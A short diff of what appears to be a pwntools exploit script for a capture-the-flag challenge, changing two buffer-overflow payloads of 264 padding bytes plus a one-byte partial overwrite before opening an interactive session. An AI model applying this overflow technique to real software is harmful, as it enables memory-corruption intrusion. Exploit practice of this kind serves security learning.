@@ -74,8 +74,8 @@ ru = lambda msg: io.recvuntil(msg)
 io = start()
 
 io.recvuntil(b">")
-io.send(b"a" * 264 + b"M")
+io.send(b"a" * 264 + b"e")
 io.recvuntil(b">")
-io.send(b"a" * 264 + b"\xc6")
+io.send(b"a" * 264 + b"\xe2")
 
 io.interactive()
